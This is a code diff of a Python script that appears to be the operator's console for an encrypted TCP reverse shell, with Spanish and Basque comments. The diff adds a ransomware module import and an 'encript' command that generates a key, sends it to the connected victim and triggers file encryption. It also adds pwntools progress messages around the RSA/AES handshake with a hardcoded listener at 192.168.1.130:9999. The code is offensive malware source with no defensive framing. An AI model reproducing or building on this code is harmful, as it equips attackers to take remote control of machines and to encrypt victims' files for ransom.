@@ -8,8 +8,11 @@ import zlib
 import pickle
 import json
 import binascii
+from pwn import * 
+from termcolor  import colored
 from fitxategiak.asimetric import asime
 from fitxategiak.aesencrypt import aesenc
+from fitxategiak.ranson import ransow
 
 
 class server(object):
@@ -17,35 +20,35 @@ class server(object):
         try: 
             #jenerador de claves
             self.GPG = asime(".")
-            self.GPG.Generastekey("server")  
+            self.GPG.Generastekey("server") 
+            self.ranso = ransow() 
             s = """
 
-                              /|
-                             / |
-                            /__|______
-                            |  __  __  |
-                            | |  ||  | |
-                            | |  ||  | |
-                            | |__||__| |
-                            |  __  __()|  
-                            | |  ||  | +                          
-                            | |  ||  | |                          
-                            | |  ||  | |                          
-                            | |__||__| |                           
-                            |__________|                                                       
+     /|
+    / |
+   /__|______
+  |  __  __  |
+  | |  ||  | | 
+  | |__||__| |
+  |  __  __()|      
+  | |  ||  | |
+  | |  ||  | |
+  | |__||__| |
+  |__________|                                                                      
+                               
+ _                                                
+| |_ ___ _ __    _ __ _____   _____ _ __ ___  ___ 
+| __/ __| '_ \  | '__/ _ \ \ / / _ \ '__/ __|/ _ \ 
+| || (__| |_) | | | |  __/\ V /  __/ |  \__ \  __/
+ \__\___| .__/  |_|  \___| \_/ \___|_|  |___/\___|
+        |_|                                                                                              
 
-                               _____ ____ ____    ____  _______     _______ ____  ____  _____ 
-                              |_   _/ ___|  _ \  |  _ \| ____\ \   / / ____|  _ \/ ___|| ____|
-                                | || |   | |_) | | |_) |  _|  \ \ / /|  _| | |_) \___ \|  _|  
-                                | || |___|  __/  |  _ <| |___  \ V / | |___|  _ < ___) | |___ 
-                                |_| \____|_|     |_| \_\_____|  \_/  |_____|_| \_\____/|_____|                                                                                                    
-
-                                            #  $                  &&&&&&            
-                                            # ##                 &&0000&&         
-                                            ####################&&&    &&&     
-                                            ####################&&&    &&&    RSA/AES ENCRIPTATION TCP 
-                                                                 &&0000&&     
-                                                                  &&&&&&                                            
+ #  $                  &&&&&&            
+ # ##                 &&0000&&         
+ ####################&&&    &&&     
+ ####################&&&    &&&    RSA/AES ENCRIPTATION TCP 
+                      &&0000&&     
+                       &&&&&&                                            
                 """
             print(s)    
             print("\n")
@@ -62,9 +65,9 @@ class server(object):
 
     def buffLengG(self):
       lengEn = self.soc.recv(1024)
+      print(lengEn)
       Strleng = str(self.decriptAes.decript(lengEn),encoding='utf-8')
       leng = int(Strleng)
-      print(leng)
       self.soc.send(b'1')
       return(leng)
 
@@ -76,7 +79,8 @@ class server(object):
         rutaJaso = self.soc.recv(lenBUffer)
         rutaJasoDEC = self.decriptAes.decript(rutaJaso)
         url = str(rutaJasoDEC,encoding='utf-8')
-        mezua = input(url + ">")
+        ar = url.split("@")
+        mezua = input(colored(ar[0],'yellow') + colored('@','red')+colored(ar[1],'cyan') +colored(">",'red'))
         if len(mezua) == 0 :
             mezua = " " 
         mezuaENc = self.encriAes.encript(bytes(mezua,encoding='utf-8'))
@@ -85,11 +89,13 @@ class server(object):
 
 
     def cmdGlobal(self):
+       
        lenBuffer = self.buffLengG()
        recCmd = self.soc.recv(lenBuffer)
        desCmd = self.decriptAes.decript(recCmd)
        print(str(desCmd,encoding='utf-8'))
-
+       
+      
 
     def getPuKey(self):
         keyP =  self.soc.recv(1024)
@@ -127,6 +133,20 @@ class server(object):
         EndecriAes = self.GPG.encrypted(bytDecriAes)
         self.soc.send(EndecriAes)
        
+    def encripTf(self,arrCmd):
+       try:
+        self.ranso.Generefolder()
+        ar = arrCmd[1:]
+        arn = " ".join(ar)
+        print(arn)
+        if arn != "pc":
+            key = self.ranso.GenerateKey(arn,"one")
+            keyen = self.encriAes.encript(bytes(key,encoding='utf-8'))
+            self.soc.send(keyen)
+            merec = str(self.decriptAes.decript(self.soc.recv(1024)),encoding='utf-8')
+            print(merec)
+       except:
+          print("falta la sintasis")
 
     def koneksioa(self):
       while True:
@@ -236,24 +256,35 @@ class server(object):
       #self.so.close()tcp koneksioa amaitu
       self.soc.close()#tcp koneksioa amaitu
 
+p1 = log.progress("iniciando tcp reverse...")
 ser = server("192.168.1.130",9999,1)
+p1.status(colored("conexion establecida",'red'))
+time.sleep(2)
+p1.status(colored("cargando clabes RSA...",'red'))
 ser.getPuKey()
 ser.postPuKey()
 ser.keysLoad()
+p1.status(colored("conesion RSA establecida",'red'))
+time.sleep(2)
+p1.status(colored("cargando claves AES...",'red'))
+time.sleep(2)
 ser.Aeskeyload()
+p1.status(colored("conesion AES establecida \n \n",'red'))
+
 
 while True:
     comand =  ser.comandLine()
     if len(comand) != 1:
         comdaExe = comand.split(" ")
-        print(comdaExe)
         arrComad = []
         for fd in comdaExe:
           if fd != "":
             arrComad.append(fd)
         if arrComad[0] == "cd":
-         print("cd")
+            None
+        if arrComad[0] == "encript":
+           ser.encripTf(arrComad)
         if arrComad[0] == "exit":
            break
-        elif arrComad[0] != "exit" and arrComad[0] != "cd":
+        elif arrComad[0] != "exit" and arrComad[0] != "cd" and arrComad[0] != "encript":
          ser.cmdGlobal()
